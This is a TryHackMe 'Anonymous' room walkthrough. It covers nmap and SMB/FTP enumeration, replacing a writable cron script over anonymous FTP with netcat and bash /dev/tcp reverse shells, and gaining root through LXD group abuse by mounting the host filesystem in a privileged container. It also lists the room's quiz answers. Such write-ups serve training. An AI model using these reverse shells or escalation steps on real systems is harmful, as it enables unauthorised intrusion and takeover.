# TryHackMe - Anonymous - Linux

- [Room](https://tryhackme.com/room/anonymous)

## Nmap

```
┌──(root💀kali)-[~/Documents/tryhackme/anonymous]
└─# nmap -T4 -sC -sV -O -p- 10.10.55.112                                                                                                                                                                                               130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 17:28 EDT
Stats: 0:04:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 38.59% done; ETC: 17:41 (0:07:53 remaining)
Stats: 0:08:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.55% done; ETC: 17:43 (0:06:38 remaining)
Nmap scan report for 10.10.55.112
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.22.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/30%OT=21%CT=1%CU=34181%PV=Y%DS=4%DC=I%G=Y%TM=62BE199
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-06-30T21:45:44
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-06-30T21:45:44+00:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1039.43 seconds
```

## SMB

```
┌──(root💀kali)-[~]
└─# smbclient -L \\10.10.55.112
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
```

## FTP

- According to our nmap We are allowed to login as anonymous. It does work  
![image](https://user-images.githubusercontent.com/96747355/176789590-00febf49-a0d5-45f4-80c5-79ca143bd02f.png)  
- Here are the files we can download in our machine for further examination  
![image](https://user-images.githubusercontent.com/96747355/176789837-68e01438-4c77-4b90-bf71-b22e6bfb1232.png)  
- Here is the content of the files  
![image](https://user-images.githubusercontent.com/96747355/176790036-bf157c8f-6b52-4e8b-97ae-d518d19a708a.png)  
- It seems like we are allowed to write in the clean.sh file. Also if we check multiple times the scripts folder we can see that the log file is regurlarly updated. It is worth modifyin the script and try to get a reverse shell with it.  
![image](https://user-images.githubusercontent.com/96747355/176791076-258219c8-e3fa-48d4-90c4-677bf7912a2f.png)
- In the picture above we can see that the second ls shows that the log file is bigger and the time is later
- Let's try to modify the clean script with this 
```
#!/bin/bash

netcat 10.13.22.56 4444 -e /bin/bash
```
- We set our listener `rlwrap nc -lvnp 4444`
- We transfer the new file  
![image](https://user-images.githubusercontent.com/96747355/176791697-6d3b82f9-82fd-4720-bbcf-2996cfa89627.png)
- So nothing happens with this. If we check the hint it mentions unexpected results with netcat.
- Let's try with bash instead of netcat `bash -i >& /dev/tcp/10.13.22.56/4444 0>&1`  
- We get a shell as the user `namelessone` after a minute or so    
![image](https://user-images.githubusercontent.com/96747355/176949498-db6076e6-9025-4dd3-87f8-86998e37237c.png)  
- We can grab the user flag

## Privilege escalation

- Let's get linpeas in our target `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
- `python3 -m http.server 80`
- From our target `wget http://10.13.22.56/linpeas.sh` and `chmod +x linpeas.sh`
- We are part of interesting groups such as lxd sudo and adm. However sudo -l does not give anything back. Let's try to abuse lxd and follow [this article](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/) 
- To summarize here are the commands I ran (using the blog post as reference)

```
# From my kali
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
sudo ./build-alpine
# Setup HTTP server to host the image
python3 -m http.server 80
# From the target
wget http://10.13.22.56/alpine-v3.16-x86_64-20220701_1459.tar.gz
mv alpine-v3.16-x86_64-20220701_1459.tar.gz alpine.tar.gz
lxc image import ./alpine.tar.gz --alias myimage
lxd init 
# we push enter to all the prompts to keep default setup
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
- It works, we are root  
![image](https://user-images.githubusercontent.com/96747355/176962259-df97417d-b029-4cba-8fc8-23d738145dc2.png)  
- We can grab the last flag. We need to access to the point where the system is mounted `cd /mnt/root` and we grab the flag `cat root/root.txt`!  

## Questions

1. Enumerate the machine.  How many ports are open? `4`
2. What service is running on port 21? `ftp`
3. What service is running on ports 139 and 445? `smb`
4. There's a share on the user's computer.  What's it called? `pics`
- I let you find the flags :) 
